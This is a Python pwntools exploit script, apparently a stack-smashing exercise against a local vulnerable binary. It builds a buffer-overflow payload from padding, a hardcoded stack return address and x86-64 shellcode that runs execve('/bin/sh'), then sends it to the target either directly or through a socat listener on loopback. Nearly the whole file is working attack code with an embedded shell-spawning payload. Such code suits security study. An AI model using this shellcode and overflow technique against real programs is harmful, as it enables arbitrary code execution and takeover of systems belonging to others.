#python3

from pwn import p64,cyclic_gen,remote
from subprocess import Popen, PIPE, STDOUT
import subprocess
import re

def createPayload():
    cyc = cyclic_gen() #JUNK
    payload = cyc.get(16)

    #TODO: I don't know where this addr is yet
    #Where we want to jump to at the ret is our stack.
    ret_addr = p64(0x7fffffffdba8,endian='little')
    #print(ret_addr)

    #This should be the bytes we want to execute on our stack.
    asmshellcode = b'\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x45\xF8\x48\x8D\x75\xF0\x48\x8D\x7D\xF8\xB2\x00\xB8\x3B\x00\x00\x00\x0F\x05'
    print("Shell code is %d bytes long." % len(asmshellcode))

    #PAYLOAD CONSTRUCTION:
    payload += ret_addr
    payload += asmshellcode

    #make sure you make this first!
    f = open("payload_memcpy.txt", "wb")
    f.write(payload)
    f.close()

    #bring back if you want to print stuff
    print("Payload: %s" % payload)
    #This line is good for gdb-peda, but since we write it to a file we can just do r < payload_memcpy.txt as well.
    #print(b'r <<< $(python2 -c "print(\'' + payload + b'\')")')
    #print("Length of payload: {}".format(len(payload)))

    return payload

def runProgramNetworked(port,exePath,output):
    #hopefully, the person running this program picks a good port
    loPortArg = 'TCP4-LISTEN:' + str(port) + ',fork'
    print("The port you entered is %d, and the arg for socat is: %s" %(port, loPortArg))
    exeArg = 'EXEC:' + exePath + ',pty'
    print("The path you entered is %s, and the arg for socat is: %s" %(exePath, exeArg))
    #run this command from the shell:
    #socat -v -v -v TCP4-LISTEN:9005,fork EXEC:/home/msprest/Desktop/StackSmash/socatter
    loopback_process = subprocess.Popen(['socat', '-v', '-v', '-v', loPortArg, exeArg],stdout=output,stderr=output,stdin=PIPE)
    print("Executable on loopback established.\n")

def pwntoolstime(port):

    loopback = '127.0.0.1'
    conn = remote(loopback,port)
    conn.send(b'TESTTEST') #Send it 1 test byte

    print("Starting to talk with the program.")
    conn.send(b'TESTTEST') #Send it 1 test byte

    for x in range(5):
        print(conn.recv().decode())
    payld = createPayload()
    
    #print(conn.recvuntil('> ', drop=False).decode())
    #recv the first few lines until we enter text.
    conn.sendlineafter('> ',payld)
    print("sent data\n")

    try:
        endText = ""
        while(True):
            endText = conn.recv().decode()
            if("Exit" in endText):
                print("Program is exiting successfully, exploit MAY NOT HAVE BEEN successful")
            print(endText)
    except(EOFError):
        print("Done!")

def runProgramTerminal(exePath):
    p = Popen(exePath,stdout=PIPE,stderr=PIPE,stdin=PIPE)
    print("Vulnerable function run in standerd input/output...")
    payld = createPayload()
    print("Sending payload...")
    pwn_attempt = p.communicate(input=payld)
    #print what we got back:
    print(pwn_attempt[0].decode())
    print("Errors: ", pwn_attempt[1].decode())

def main():
    import sys
    import getopt

    #logging the connection:
    output = open("/tmp/output.txt", "wb")

    #Need some system arguments
    #n = networked. Do we want it to be over network or terminal? should be true or false.
    # examples: -n true or -n false

    #p = port. We need a port for networking.
    # examples: -p 9000 or -p 60032

    #l = location. We need the absolute path to the exe no matter what
    # example: -l /home/user/Desktop/vulnExe

    argv = sys.argv[1:]

    try:
        options,args = getopt.getopt(argv,"n:p:l:",["networked =","port =","location ="])
    except:
        print("There's something wrong with the system arguments.")

    networked = False
    absPath = ""
    port = 0
    index = 0
    for name, value in options:

        #first we need a path to the payload.
        if(name in ['-l','--location']):
            absPath = value#[1:] #it grabs the space between -l and path too.
        elif(absPath == ""):
            if(index != len(options)-1):
                pass
            else:
                print("Please enter a location")
        index = index + 1

        if(name in ['-n','--networked']):
            if(value == "true"):
                networked = True
            else:
                pass #it's false by default

        if(name in ['-p','--port']):
            port = int(value)

    #ok now we have system args. Double check:
    print("The path is: %s" % absPath)
    print("The boolean if we are networking is: %d" % networked)
    print("(0 = False, 1 = True)")
    print("If we are networked, the port should be: %d, if not, this should say 0 (but default to 9000)." % port)
    
    if(networked):
        if(port > 2000 and port < 65353): #another option for this check: (isinstance(port,int)):
            runProgramNetworked(port,absPath,output)
            pwntoolstime(port)
        else:
            print("Valid port not found. Defaulting to port 9000 on loopback.")
            runProgramNetworked(9000,absPath,output)
            pwntoolstime(9000)
    else:
        runProgramTerminal(absPath)

    #################################################################
    #                                                               #
    #                       OLD MAIN FUNC                           #
    #                                                               #
    #################################################################

    # #system arguments are:
    # #argv[1] = port
    # #argv[2] = path to the executable
    # if(sys.argv[1] != None):
        
    #     port = int(sys.argv[1])
    #     exePath = sys.argv[2] #This one should be a string.

    #     print("Port you entered is: %d." % port)
    #     if(port > 2000 and port < 65353): #another option for this check: (isinstance(port,int)):
    #         runProgram(port,exePath,output)
    #         pwntoolstime(port)
    #     else:
    #         print("Valid port not found. Defaulting to port 9000 on loopback.")
    #         runProgram(9000,output,"/home/msprest/Desktop/StackSmash/socatter")
    #         pwntoolstime(9000)
    # else:
    #     print("Please include system argument options! The first system argument should be your desired port number, and the second should be your absolute path to the vulnerable executable.")

if __name__ == '__main__':
    main()